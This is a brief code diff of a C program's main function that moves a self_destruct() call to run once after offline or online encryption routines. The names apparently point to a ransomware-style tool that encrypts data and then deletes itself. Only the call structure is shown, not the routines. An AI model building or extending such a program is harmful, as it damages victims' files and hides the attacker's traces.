@@ -37,14 +37,13 @@ int online_enc();
 int main() {
     if (OFFLINE_ENC) {
         offline_enc();
-        self_destruct();
     }
 
     if (ONLINE_ENC) {
         online_enc();
-        self_destruct();
     }
 
+    self_destruct();
 
     return 0;
 }
